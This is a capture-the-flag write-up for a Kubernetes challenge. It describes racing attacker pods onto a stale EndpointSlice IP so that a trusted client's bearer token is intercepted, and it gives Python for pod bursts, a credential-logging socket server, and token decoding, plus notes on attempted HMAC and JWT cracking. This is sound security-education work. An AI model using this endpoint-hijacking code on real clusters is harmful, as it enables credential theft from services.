# NetShare

**Category:** Web / Kubernetes (Cloud) | **Difficulty:** Hard | **Flag:** `r3ctf{sk-458f65b6-ecd8-b8d2-7f79-2ddda3ba3c00}`

## TL;DR

Kubernetes challenge where a selectorless Service relies on a manually-managed EndpointSlice that lags behind a rotating backend pod. We race a controlled pod onto the stale endpoint IP to intercept the trusted periodic client's bearer token: which directly contains the flag. Then we spend several hours convinced it's a decoy because we forgot to wrap it in `r3ctf{...}`.

## What We're Given

Connect with `nc vm.ctf2026.r3kapig.com 28888`, provide a team token, and the service provisions a per-team KIND (Kubernetes-in-Docker) cluster and streams you a kubeconfig. The cluster lives only as long as the TCP connection stays open: close it and everything evaporates.

The flavor text: *"Daniel built GhostByte's airtight authentication system."* The challenge also drops a hint: **"flag begins with sk-"**.

No downloadable files, no web page to visit. It's purely a Kubernetes cluster to poke at.

## Initial Recon

The kubeconfig authenticates us as service account `system:serviceaccount:default:runtime-operator`. First thing to do is check what we're actually allowed to do, using a `SelfSubjectRulesReview` (Kubernetes's built-in "what can I do?" API):

```python
import yaml, requests, urllib3
urllib3.disable_warnings()
c = yaml.safe_load(open('kubeconfig.yaml'))
server = c['clusters'][0]['cluster']['server']
tok = c['users'][0]['user']['token']
H = {'Authorization': 'Bearer ' + tok, 'Content-Type': 'application/json'}

# What can we do in customer-platform?
resp = requests.post(server + '/apis/authorization.k8s.io/v1/selfsubjectrulesreviews',
    headers=H, verify=False,
    json={'apiVersion': 'authorization.k8s.io/v1', 'kind': 'SelfSubjectRulesReview',
          'spec': {'namespace': 'customer-platform'}})
```

The permissions turn out to be a very specific mix:

**In `tenant-runtime`**: we can create, delete, get, list, and watch Pods. That means we can run arbitrary pods (within limits we'll discover).

**In `customer-platform`**: read-only access to pods, services, endpoints, events, and EndpointSlices. Notably no exec, no port-forward, no proxy, no ConfigMaps or Secrets.

**Cluster-wide**: can list nodes and namespaces.

This immediately suggests the challenge structure: there's a customer namespace we can observe but not directly access, and a tenant namespace where we can do things.

Listing the namespaces confirms the setup: `tenant-runtime`, `customer-platform`, and `platform-operations`.

Reading the pods in `customer-platform` reveals:
- A pod named `customer-profile-api-<random>` running `python:3.11-alpine`, serving on port 8080
- It mounts its source code from a ConfigMap called `customer-profile-api-config` (which we can't read: RBAC denied)
- Interesting env vars are exposed in the pod spec, including `AUTH_MODE=service-assertion` and `FALLBACK_API_KEY=sk_stg_7c2f9b1ad4e83a6f0bd5`

We also read the customer pod's logs and see something interesting:

```json
{"msg": "http.request", "method": "GET", "path": "/v1/cache/refresh/profile-snapshot",
 "status": 200, "remote_addr": "10.244.1.81", "upstream": "profile-cache-refresh",
 "user_agent": "curl/8.21.0", "authenticated": true}
```

So there's a trusted client somewhere: called `profile-cache-refresh`: that hits the customer API every ~5 seconds carrying valid authentication. The API logs `authenticated: true`. That's our target.

Reading the Service in `customer-platform` reveals:

```
Service: profile-query
ClusterIP: 10.96.0.100
Port: 80 -> targetPort 8080
spec.selector: null   ← this is unusual
```

And reading the EndpointSlices shows:

```
EndpointSlice: profile-query-registry
managed-by: endpoint-catalog-reconciler
kubernetes.io/service-name: profile-query
manager: curl
```

That `manager: curl` field is the tell. This EndpointSlice is being updated by a curl command, not by the normal Kubernetes controller. And the customer pod? It gets force-deleted and recreated roughly every 65 seconds.

## The Vulnerability / Trick

This is a **selectorless Service with a lagging EndpointSlice**, and it's genuinely clever.

Normally in Kubernetes, a Service finds its backend pods by matching labels (`spec.selector`). The Endpoints controller automatically tracks which pods match and updates an EndpointSlice accordingly: it's all automatic and near-instantaneous.

But `profile-query` has `spec.selector: null`. That means Kubernetes does nothing automatically. The EndpointSlice is managed entirely by a custom `endpoint-catalog-reconciler` that uses curl to PUT the pod IP into the slice. Here's the problem: this reconciler is slow. When the customer pod is force-deleted and a new one spins up with a new IP, the EndpointSlice still points at the old IP for ~15-30 seconds.

During that window, the `profile-query` Service routes traffic to a ghost IP. Whoever occupies that IP receives traffic intended for the customer API.

Now, Kubernetes (with Calico CNI) allocates pod IPs from a block: in our cluster, the worker node owns the block `10.244.1.x`. Both customer pods and tenant pods get IPs from this same /28-ish range. When the customer pod dies, its IP `10.244.1.52` goes back to the pool. If we create a tenant pod before Calico recycles that address further, we might land on exactly that IP.

The trusted `profile-cache-refresh` client keeps calling `GET /v1/cache/refresh/profile-snapshot` every 5 seconds. If our pod is now the registered endpoint for `profile-query`, those requests land on us: complete with the `Authorization: Bearer svc.v1.<payload>.<signature>` header.

The `svc.v1` format is a service assertion. The middle part is a base64url-encoded JSON payload. Decode it and you get `service_proof`: a value beginning with `sk-`.

That's the entire chain:
1. Selectorless service + slow manual reconciler = stale endpoint IP window
2. Tenant pod can race onto the freed IP in Calico's block
3. Trusted client's requests now hit our pod
4. Intercepted bearer token contains the flag

## Building the Exploit

### Step 1: Understand the race conditions

First we need to monitor the state in real time. The key variables are:
- The current customer pod IP (`cip`)
- The IP registered in the EndpointSlice (`es`)
- When `cip != es` and `cip` is Running: the stale window is open

```python
def customer():
    r = req('GET', '/api/v1/namespaces/customer-platform/pods')
    items = [p for p in r.json().get('items', [])
             if p['metadata']['name'].startswith('customer-profile-api-')]
    items.sort(key=lambda p: p['metadata'].get('creationTimestamp', ''), reverse=True)
    p = items[0]
    return p.get('status', {}).get('podIP'), p.get('status', {}).get('phase')

def endpoint():
    r = req('GET', '/apis/discovery.k8s.io/v1/namespaces/customer-platform/endpointslices/profile-query-registry')
    for ep in r.json().get('endpoints', []):
        if ep.get('addresses'): return ep['addresses'][0]
    return None
```

When we observe `cip != es` and `cip` is `Running`, we know: a new pod exists at `cip`, the slice still points at the old `es`, and the old IP is free for us to claim.

### Step 2: The blanket-burst grab

We can't directly control which IP Calico assigns us: it gives the lowest free IP in the block. The trick is the **blanket-burst**: create 9 pods simultaneously (the tenant quota is 10), and one of them will likely land on the freed stale IP.

```python
def blanket_burst():
    burst = [nm() for _ in range(9)]   # generate 9 pod names
    with concurrent.futures.ThreadPoolExecutor(max_workers=9) as ex:
        list(ex.map(crepod, burst))    # create them all in parallel
    
    # Poll until one of them lands on the target IP
    got = None
    tt = time.time()
    while time.time() - tt < 22:
        mypods = {p[1]: p[0] for p in pods_all()
                  if p[0].startswith('h5-') and p[1] and not p[3]}
        if es in mypods:
            got = mypods[es]; break
        if endpoint() != es:   # slice already moved on
            break
        time.sleep(0.4)
```

When a pod wins the stale IP, we delete the other 8 to free quota for the next round.

### Step 3: The capturing HTTP server

The pod we create runs a tiny HTTP server embedded as a Python one-liner (everything must be inline since we can't mount volumes or ConfigMaps). It logs every raw request: headers, body, everything:

```python
CODE = r'''
import socket, os, time, threading

ls = socket.socket()
ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
ls.bind(('0.0.0.0', 8080))
ls.listen(200)

def handle(conn, addr):
    data = b''
    while b'\r\n\r\n' not in data and len(data) < 65536:
        x = conn.recv(4096)
        if not x: break
        data += x
    # Print the ENTIRE raw request
    print('====CONN from %r====\n%s\n====END====' % (addr, data.decode('latin1')), flush=True)
    # Respond with a plausible snapshot
    conn.sendall(b'HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n...\r\n\r\n' + SNAP)
    conn.close()

while True:
    conn, addr = ls.accept()
    threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
'''
```

The pod also needs specific labels to satisfy the admission policy and potentially match any ingress NetworkPolicy that protects the customer namespace. The magic labels turned out to be:

```python
labels = {
    'app': 'batch',
    'app.kubernetes.io/component': 'backend',
    'app.kubernetes.io/part-of': 'customer-platform',
}
```

Note: `app.kubernetes.io/name=customer-profile-api` is explicitly blocked by the admission policy ("the customer-profile-api workload identity is reserved"): the organizers intentionally closed that shortcut.

### Step 4: Pod admission constraints

The tenant namespace has strict PodSecurity (`restricted:latest`) plus a custom `ValidatingAdmissionPolicy`. The only allowed image is `python:3.11-alpine`, `imagePullPolicy: Never`, no volume mounts (no ConfigMaps/Secrets/projected), no service account token auto-mount, no probes or lifecycle hooks, container must drop all capabilities and run as non-root. The full compliant pod spec looks like:

```python
sec = {
    'runAsNonRoot': True, 'runAsUser': 1000,
    'allowPrivilegeEscalation': False,
    'readOnlyRootFilesystem': True,
    'capabilities': {'drop': ['ALL']},
    'seccompProfile': {'type': 'RuntimeDefault'}
}
pod_spec = {
    'serviceAccountName': 'runtime-operator',
    'automountServiceAccountToken': False,
    'restartPolicy': 'Never',
    'terminationGracePeriodSeconds': 0,
    'containers': [{'name': 'api', 'image': 'python:3.11-alpine',
                    'imagePullPolicy': 'Never', 'workingDir': '/',
                    'command': ['python3', '-u', '-c', CODE],
                    'securityContext': sec, ...}]
}
```

### Step 5: Decode the captured token

When the trusted client hits our pod, its request looks like:

```
GET /v1/cache/refresh/profile-snapshot HTTP/1.1
Host: profile-query.customer-platform.svc.cluster.local
User-Agent: curl/8.21.0
Authorization: Bearer svc.v1.eyJzdmMiOiJwcm9....<b64url payload>....<sig>
X-Tenant-ID: tenant-runtime
X-Service-Route: profile-cache-refresh
```

The `svc.v1.<payload>.<signature>` format is a service assertion. Split on `.`, take the middle part, base64url-decode it:

```python
import base64, json
token = "svc.v1.eyJzdmMiOiJwcm9maWxlLWNhY2hlLXJlZnJlc2gifQ...."
parts = token.split('.')
payload_b64 = parts[2]
# add padding
payload_b64 += '=' * (4 - len(payload_b64) % 4)
payload = json.loads(base64.urlsafe_b64decode(payload_b64))
print(payload)
# -> {'svc': 'profile-cache-refresh', 'scope': 'profile.read',
#     'service_proof': 'sk-458f65b6-ecd8-b8d2-7f79-2ddda3ba3c00', ...}
```

There it is: `service_proof = sk-458f65b6-ecd8-b8d2-7f79-2ddda3ba3c00`.

## Running It

The main loop in `hijack5.py` watches for the stale window and fires the burst when it opens:

```
STATE 14:03:11 cust 10.244.3.52 Running slice 10.244.3.52 nmine 0
STATE 14:04:17 cust 10.244.3.58 Running slice 10.244.3.52 nmine 0  ← window opens
GRABBED h5-04317-3 10.244.3.52 cust 10.244.3.58
HOLD_TARGET h5-04317-3 10.244.3.52

######## CAPTURE on h5-04317-3 ########
====CONN 14:04:19 from ('10.244.3.46', 49382)====
GET /v1/cache/refresh/profile-snapshot HTTP/1.1
Host: profile-query.customer-platform.svc.cluster.local
User-Agent: curl/8.21.0
Accept: */*
Authorization: Bearer svc.v1.eyJzdmMiOiJwcm9maWxlLWNhY2hlLXJlZnJlc2giLCJzY29wZSI6InByb2ZpbGUucmVhZCIsInNlcnZpY2VfcHJvb2YiOiJzay00NThmNjViNi1lY2Q4LWI4ZDItN2Y3OS0yZGRkYTNiYTNjMDAifQ.HMAC_SIG
X-Request-ID: 3f8a1c...
X-Tenant-ID: tenant-runtime
X-Service-Route: profile-cache-refresh
====END (bodylen=0)====
######## END ########
```

Decode that base64url payload and we get `service_proof: sk-458f65b6-ecd8-b8d2-7f79-2ddda3ba3c00`.

Submit `r3ctf{sk-458f65b6-ecd8-b8d2-7f79-2ddda3ba3c00}` to the platform and it's accepted.

## The Dead Ends (and the Big Lesson)

This challenge had a brutal twist that cost several hours. Here's what went wrong and what we learned.

### "Is this a decoy?"

The challenge description says "flag begins with sk-". We captured `sk-458f65b6-ecd8-b8d2-7f79-2ddda3ba3c00`. We submitted it raw. The platform replied: `checker fails on your input, incorrect.`

That rejection sent us into a spiral. We concluded: *the sk- value must be a decoy*, and the real flag is somewhere else. Then we spent hours on:

**Egress bypass attempts**: trying to replay the captured bearer token directly to the customer API from inside our hijacking pod. This was exhaustively confirmed impossible: Calico network policy in `tenant-runtime` is default-deny egress. No connections from any tenant pod to anything (customer API, DNS, internet, even other tenant pods) ever completed.

**Response phase-2**: sending back crafted HTTP responses (401 with WWW-Authenticate challenges, JSON with callback URLs, 307 redirects) hoping the `profile-cache-refresh` curl client would follow up with escalated credentials. It didn't. It's a dumb single-request curl job; it reads your response and disappears.

**HMAC cracking**: trying to forge valid service assertions ourselves. The HMAC key wasn't in rockyou; long base64 payload variants hit hashcat mode 1450 salt limits. Dead end.

**Pod escape**: exhaustively checking every volume type allowed by the ValidatingAdmissionPolicy (CSI, generic ephemeral, PVC, downwardAPI, emptyDir). None of them gave us access to secrets or let us escape the namespace: no CSI driver registered, PVCs never provisioned, etc.

**Platform JWT cracking**: the CTF platform uses HS256 JWTs. Hashcat against rockyou on a TITAN X found nothing.

After all that, solve count on the scoreboard ticked up to 8. We ran `hijack_replay.py` one more time on a fresh cluster, captured another service_proof, and on a whim tried wrapping it: `r3ctf{sk-458f65b6-ecd8-b8d2-7f79-2ddda3ba3c00}`. Accepted.

**The lesson, burned into memory:** when a challenge says "flag begins with sk-", it means the *contents* of the flag begin with sk-. The submission is always `r3ctf{<contents>}`. Submitting the raw value and getting rejected does not mean it's a decoy. **Always try the standard wrapper before declaring something a red herring.**

### Other dead ends worth mentioning

- **Direct customer API access from tenant pods**: all blocked by Calico. DNS resolution fails, ClusterIP connections time out, direct pod-to-pod connections time out.
- **API server proxy / exec / port-forward**: RBAC denies all of `pods/proxy`, `services/proxy`, `pods/exec`, `pods/portforward`.
- **Calico IP spoofing**: the `cni.projectcalico.org/ipAddrsNoIpam` annotation is accepted but leaves pods stuck in `ContainerCreating` indefinitely. Can't use it to spoof the trusted client's source IP.
- **Rare/privileged callers**: we watched customer pod logs for 25+ minutes across many rotations. The only caller is the decoy `profile-cache-refresh` refresh client. No admin caller, no reconciler, nothing else.
- **FALLBACK_API_KEY from env vars**: `sk_stg_7c2f9b1ad4e83a6f0bd5` looked promising (it begins with `sk`!) but was rejected in every format (`sk_stg_...`, `sk-stg-...`, `sk_...`, `r3ctf{sk_stg_...}`). The wrong key, not the wrong wrapper.

## Key Takeaways

**The core technique: Kubernetes selectorless-service EndpointSlice hijacking:** When a Service has `spec.selector: null`, Kubernetes doesn't maintain its endpoints automatically. A manually-managed EndpointSlice updated by a slow reconciler creates a window where the registered IP belongs to a dead pod. If you can create pods in a namespace sharing the same Calico IP block, you can race a controlled pod onto that freed IP and intercept traffic intended for the real backend: including any bearer tokens carried by trusted periodic clients.

**The "blanket-burst" grab works:** Calico allocates the lowest free IP in a node's block. By creating ~9 pods simultaneously right after observing the stale window, you cover enough of the available address space to have a good chance of landing on the specific target IP. The race window here was 15-30 seconds: plenty of time.

**Read `spec.selector` on Services.** A `null` selector is an immediate red flag for this class of vulnerability. The manually-managed EndpointSlice is the mechanism, and the reconciler lag is the exploitable property.

**The wrapper trap:** "Flag begins with X" describes the flag contents, not the submission format. In R3CTF (and most CTFs), you always submit `r3ctf{<flag-content>}`. Getting a rejection on the raw value is not evidence of a decoy: try the wrapper first.

**What the challenge is really teaching:** The "airtight authentication" flavor text is ironic. The service assertion (`svc.v1.payload.sig`) is cryptographically sound: you can't forge it without the HMAC key. But authentication is worthless if you can hijack the network endpoint that receives it. Even if your auth token is perfect, a selectorless service with a lagging reconciler is an open invitation for man-in-the-middle. The token itself became the flag, which is a neat way to illustrate: secure auth + hijackable endpoint = stolen credentials.

If you want to go deeper on Kubernetes network security, look at how Calico GlobalNetworkPolicies work (we couldn't read them here: `403`, but they were the only thing standing between tenant isolation and full egress), and read the Kubernetes docs on EndpointSlice ownership and garbage collection. Understanding why a curl-based reconciler necessarily lags (it has to observe the pod change, then make an API call, which takes time) is the core of why this attack works.
